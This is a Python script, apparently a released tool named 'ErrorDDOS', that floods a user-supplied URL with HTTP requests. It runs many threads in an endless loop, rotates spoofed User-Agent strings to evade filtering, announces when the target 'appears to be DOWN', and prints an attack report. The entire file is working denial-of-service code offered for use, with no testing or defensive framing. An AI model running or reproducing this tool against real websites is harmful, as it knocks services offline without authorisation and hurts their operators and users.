import urllib.request
import threading
import time
import random
import sys
from urllib.error import URLError, HTTPError
from datetime import datetime

class ErrorDDOS:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)",
            "Mozilla/5.0 (Linux; Android 10; SM-G960U)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        self.running = False
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.timeout = 3
        self.threads = []
        self.start_time = None
        self.consecutive_failures = 0
        self.down_alert_triggered = False
        self.failure_threshold = 5

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def print_status(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")

    def alert_website_down(self):
        print("\n" + "❗" * 25)
        self.print_status("🚨 ALERT: Website appears to be DOWN!")
        print("❗" * 25 + "\n")

    def send_request(self, url):
        if not self.running:
            return
        try:
            req = urllib.request.Request(
                url,
                headers={'User-Agent': self.get_random_user_agent()}
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                self.request_count += 1
                self.success_count += 1
                self.consecutive_failures = 0
                self.print_status(f"✅ #{self.request_count} | Status: {response.status}")
        except Exception as e:
            self.request_count += 1
            self.failed_count += 1
            self.consecutive_failures += 1
            self.print_status(f"❌ #{self.request_count} | Error: {str(e)}")
            if self.consecutive_failures >= self.failure_threshold and not self.down_alert_triggered:
                self.alert_website_down()
                self.down_alert_triggered = True

    def start_attack(self, url, threads=100, duration=None):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        self.show_banner()
        print(f"\n🌐 Target: {url}")
        print(f"🔧 Threads: {threads}")
        print(f"⏳ Duration: {'∞ Infinite' if duration is None else str(duration) + 's'}")
        print("\n🔥 Launching attack... Press CTRL+C to stop\n")
        
        self.running = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.consecutive_failures = 0
        self.down_alert_triggered = False
        self.start_time = time.time()
        
        for _ in range(threads):
            t = threading.Thread(target=self.continuous_requests, args=(url,))
            t.daemon = True
            self.threads.append(t)
            t.start()

        try:
            if duration:
                time.sleep(duration)
                self.stop_attack()
            else:
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()

    def continuous_requests(self, url):
        while self.running:
            self.send_request(url)
            time.sleep(0.05)

    def stop_attack(self):
        self.running = False
        for t in self.threads:
            t.join()
        duration = time.time() - self.start_time
        self.show_results(duration)

    def show_banner(self):
        print("\n" + "="*60)
        print("🚫 ERROR DDOS – 🚫".center(60))
        print("="*60)
        print("⚠️ Developed by 👉🏻 @ERROR0101r⚠️".center(60))
        print("="*60)

    def show_results(self, duration):
        print("\n" + "="*60)
        print("📊 ATTACK REPORT".center(60))
        print("="*60)
        print(f"⏱ Total Time: {duration:.2f} seconds")
        print(f"📦 Total Requests: {self.request_count}")
        print(f"✅ Successful: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"⚡ RPS: {self.request_count / duration:.2f}" if duration > 0 else "")
        print("="*60 + "\n")

def get_input(prompt, default=None):
    while True:
        try:
            value = input(f"{prompt} [{'∞' if default is None else default}]: ").strip()
            if value == "" and default is not None:
                return default
            elif value == "" and default is None:
                return None
            return int(value)
        except ValueError:
            print("❌ Please enter a valid number or leave blank for default.")

if __name__ == "__main__":
    ddos = ErrorDDOS()
    try:
        ddos.show_banner()
        url = input("🌐 Enter Target URL: ").strip()
        threads = get_input("🔧 Threads", 100)
        duration = get_input("⏳ Duration (seconds, leave blank for infinite)", None)
        ddos.start_attack(url, threads, duration)
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        sys.exit(0)